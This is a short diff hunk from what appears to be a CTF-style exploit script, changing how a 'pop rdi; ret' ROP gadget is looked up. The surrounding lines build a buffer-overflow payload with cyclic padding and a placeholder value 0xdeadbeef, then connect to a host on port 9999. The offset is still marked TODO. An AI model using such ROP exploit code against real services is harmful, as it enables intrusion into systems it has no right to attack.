@@ -379,7 +379,7 @@ let port = 9999
 let elf = analyze(binary)
 let offset = 72  # TODO: Find offset
 let gadgets = quick_rop(binary)
-let pop_rdi = gadgets.find("pop rdi; ret")
+let pop_rdi = find(gadgets, "pop rdi; ret")
 
 let conn = connect(host, port)
 let payload = cyclic(offset) + p64(pop_rdi) + p64(0xdeadbeef)
